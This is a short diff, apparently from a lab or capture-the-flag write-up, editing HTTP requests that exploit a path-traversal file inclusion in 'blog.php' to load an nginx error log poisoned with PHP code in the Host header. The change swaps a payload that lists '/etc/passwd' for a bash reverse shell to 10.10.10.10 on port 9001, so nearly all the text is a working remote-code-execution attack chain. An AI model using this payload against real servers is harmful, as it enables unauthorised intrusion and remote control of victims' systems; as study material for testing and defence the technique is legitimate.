@@ -20,6 +20,6 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 F
 ```
 ```http
 GET /blog.php?page=../../../../var/log/nginx/error.log
-Host: <?php system('ls /etc/passwd') ?>
+Host: <?php system('/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1') ?>
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
 ```
